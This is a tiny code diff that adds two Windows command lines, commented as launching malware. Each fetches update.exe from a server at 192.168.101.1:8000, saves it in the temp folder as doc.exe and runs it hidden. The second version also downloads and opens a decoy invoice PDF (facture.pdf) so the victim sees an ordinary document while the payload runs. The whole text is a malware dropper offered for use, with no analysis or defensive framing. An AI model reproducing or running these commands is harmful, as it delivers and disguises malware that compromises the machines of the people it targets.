@@ -1,0 +1,7 @@
+// just to launch the malware
+
+cmd.exe /c curl -s -o %TEMP%\doc.exe http://192.168.101.1:8000/update.exe && start /B %TEMP%\doc.exe
+
+// to launch the malware and a good pdf
+
+cmd.exe /c curl -s -o %TEMP%\doc.exe http://192.168.101.1:8000/update.exe & curl -s -o %TEMP%\facture.pdf http://192.168.101.1:8000/facture.pdf & start %TEMP%\facture.pdf & start /B %TEMP%\doc.exe
